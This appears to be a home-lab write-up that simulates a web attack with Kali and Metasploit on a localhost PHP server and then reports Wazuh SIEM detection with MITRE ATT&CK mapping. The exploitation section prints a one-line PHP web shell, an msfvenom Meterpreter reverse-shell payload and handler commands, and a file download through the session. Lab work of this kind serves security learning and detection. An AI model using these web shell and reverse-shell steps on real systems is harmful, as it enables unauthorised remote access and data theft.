# Simulated-Web-Attack-Wazuh-SOC-Detection-Report-in-a-controlled-home-lab
Simulated a full web application attack using Kali Linux and Metasploit, covering payload delivery, reverse shell access, privilege escalation, and data exfiltration, while simultaneously analysing detection via Wazuh SIEM with MITRE ATT&amp;CK mapping, logs, vulnerabilities, and SOC correlation.

## Overview
In this lab, I simulated a realistic web application attack using Kali Linux and the Metasploit Framework.
The goal wasn’t just to “make it work” — it was to understand the full attack flow, troubleshoot when things broke, and validate everything properly from both an attacker and defender perspective.

## What I Did
Set up a vulnerable PHP web environment
Generated and deployed a reverse shell payload
Gained a Meterpreter session
Enumerated the system as a low-privilege user
Extracted a target file (flag)
Analysed what would be visible from a SOC perspective

## Setup
Create the victim environment
sudo adduser victim --disabled-password --gecos ""
sudo mkdir -p /home/victim/web/uploads
sudo chown -R victim:victim /home/victim/web

Create vulnerable endpoint + flag
echo '<?php system($_GET["cmd"]); ?>' | sudo tee /home/victim/web/uploads/upload.php
echo "FLAG{simulated_web_flag}" | sudo tee /home/victim/web/uploads/flag.txt
sudo chown -R victim:victim /home/victim/web/uploads
Start the web server
sudo apt update
sudo apt install php -y
sudo -u victim php -S 127.0.0.1:8080 -t /home/victim/web/uploads

##Exploitation

### Generate payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o shell.php

### Deploy payload
sudo cp shell.php /home/victim/web/uploads/
sudo chown victim:victim /home/victim/web/uploads/shell.php
Start listener
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run

Trigger it
curl http://127.0.0.1:8080/shell.php

## What Worked
This is where everything came together:
Meterpreter session opened successfully
Confirmed access as:
getuid
→ victim
System info retrieved:
sysinfo

### Navigated to web directory and pulled the flag:
cd /home/victim/web/uploads
download flag.txt

✔ At this point, the system was effectively compromised from a web entry point
 What Didn’t Work (At First)

Issue 1: Payload didn’t execute
I was hitting:
curl shell.php
…but nothing happened.

 I realised:
Uploading a payload ≠ executing it
The execution context matters
Issue 2: No session in Metasploit
Handler was running, but no connection.

### Root cause:
Payload wasn’t being triggered properly
Fix
Once I:
aligned the payload + handler correctly
triggered it properly through the web server
👉 everything worked instantly

 ## Key Lessons
Execution context is everything in web exploitation
Just because a file exists doesn’t mean it runs
Reverse shells depend on timing + configuration
Troubleshooting is part of the skill — not a failure

## SOC Perspective
From a detection point of view (e.g. Wazuh), this activity would likely trigger:
Suspicious PHP execution
Reverse connection behaviour
Unusual activity under a user account
File access in sensitive directories

##Indicators of Compromise
/home/victim/web/uploads/shell.php
Reverse connection to 127.0.0.1:4444
PHP spawning system commands
Access to flag.txt

## Cleanup
sudo pkill -f "php -S"
sudo deluser --remove-home victim
sudo rm -rf /home/victim
rm -f shell.php
sudo apt autoremove -y

## Final Thoughts
This lab really clicked once I stopped just following steps and started thinking about:
how execution actually works
why things fail
what it would look like from a defender’s side
It’s a simple setup, but it reflects real concepts used in actual attacks.

## Skills Demonstrated
Web exploitation basics
Metasploit usage
Linux enumeration
Post-exploitation workflow
SOC awareness

Also, as part of this lab, endpoint activity from a Kali Linux system was monitored using Wazuh SIEM. The objective was to validate whether simulated attacker behaviour could be detected, correlated, and mapped to MITRE ATT&CK techniques.
The results confirm that Wazuh successfully captured and classified multiple stages of an attack lifecycle, including authentication activity, privilege escalation, persistence, and defense evasion.

## Executive Summary
Total Events: ~401 (last 24 hours)
High Severity Alerts (Level 12+): 0
Authentication Successes: 103
Authentication Failures: 3
Dominant MITRE ATT&CK Tactics:
Defense Evasion: ~202 events
Privilege Escalation: ~201 events
Persistence: ~108 events
Initial Access: ~103 events
Impact: ~6 events

## Key Observation:
The activity reflects a controlled attack simulation where valid credentials and privilege escalation techniques were used and successfully detected.

## Threat Hunting Analysis
Authentication Behaviour
Observed pattern:
Authentication Attempt
→ Authentication Failure
→ Authentication Success
→ PAM Session Opened
This sequence indicates simulated credential testing or controlled login attempts.
SOC Interpretation:
Low to Medium severity
Potential precursor to privilege escalation in real-world scenarios

## MITRE ATT&CK Mapping
T1078 – Valid Accounts (Defense Evasion)
Evidence:
PAM login sessions opened
Successful user authentication
Repeated login activity

## Interpretation:
Attackers used legitimate credentials to blend into normal system activity.
T1548.003 – Sudo Abuse (Privilege Escalation)
Evidence:
“Successful sudo executed”
“Successful sudo to ROOT executed”

## Interpretation:
User account escalated privileges to root using sudo.
This represents a clear and successful privilege escalation event.

## Persistence Activity
Indicators:
Continued session activity
Account usage patterns
Repeated authentication behaviour

## Interpretation:
Simulated persistence through valid account access and session continuity.
Initial Access
Indicators:
Login attempts
Authentication successes
Interpretation:
Represents initial entry into the system via valid credentials.
Impact
Only 6 events recorded.
Interpretation:
No destructive or disruptive behaviour observed (e.g., no ransomware or service disruption).

## Event Log Evidence
Rule 5501
Description: PAM login session opened
Mapping: T1078
Meaning: Successful authentication
Rule 5407
Description: Successful sudo executed
Meaning: Privileged command execution
Rule 5402
Description: Successful sudo to ROOT executed
Meaning: Root-level access achieved

## Endpoint Visibility
Agent ID: 001
OS: Kali Linux
Wazuh Version: 4.14.5
System remained fully visible throughout the attack simulation:
No agent disconnects
No telemetry loss
Continuous log ingestion

## Vulnerability Detection
High Severity Vulnerability: 1
Affected Package: weasyprint
SOC Insight:
Attackers could leverage vulnerable packages post-compromise.

## Security Configuration Assessment
CIS Benchmark Score: 46%
Passed: 84
Failed: 98
Key Risks:
Weak system hardening
Potential misconfigurations
Missing security controls
Interpretation:
The system is not fully hardened and presents multiple opportunities for exploitation.

## Reconstructed Attack Chain
Initial Access (Valid Login)
→ Authentication Success
→ PAM Session Opened
→ Sudo Execution
→ Privilege Escalation (Root Access)
→ Persistence Activity
→ Defense Evasion via Valid Credentials

## SOC Evaluation
Detection Capability: 8.5/10
Wazuh successfully:
Detected authentication events
Logged privilege escalation
Mapped ATT&CK techniques
Correlated attack behaviour
Endpoint Security Posture: 5/10
Low CIS compliance (46%)
Presence of high-severity vulnerability
Multiple failed security controls
Attack Visibility: 9/10
The attack chain is clearly visible across logs and dashboards, making it highly suitable for SOC training and analysis.

## Key takeaway (Red Team vs Blue Team understanding)

This lab helped me clearly understand the relationship between Red Team and Blue Team roles in cybersecurity:
As a Red Team perspective, I learned how attackers think: identifying entry points, exploiting misconfigurations, and maintaining access through payloads and system interaction.
As a Blue Team perspective, I saw how every action leaves traces — from suspicious web requests to unusual process execution and file access patterns.

## Why this mattered:
Red Teaming showed me how breaches happen in practice, not just theory
Blue Team thinking showed me how those same actions are detected and investigated
I learned that effective cybersecurity depends on both sides working in balance
Every attack step I performed could directly map to a detection opportunity in a SIEM like Wazuh

## Final insight

This lab made it clear that cybersecurity isn’t just about attacking or defending — it’s about understanding both perspectives to build stronger detection, response, and prevention strategies.

## Reproducibility Notes
To replicate this analysis:
Deploy a Wazuh agent on a Linux endpoint
Generate authentication and sudo activity
Monitor dashboards:

## MITRE ATT&CK view
Authentication logs
Rule-based alerts
Correlate events across:
PAM logs
Sudo logs
System activity
Ensure logging and agent communication remain active during testing.
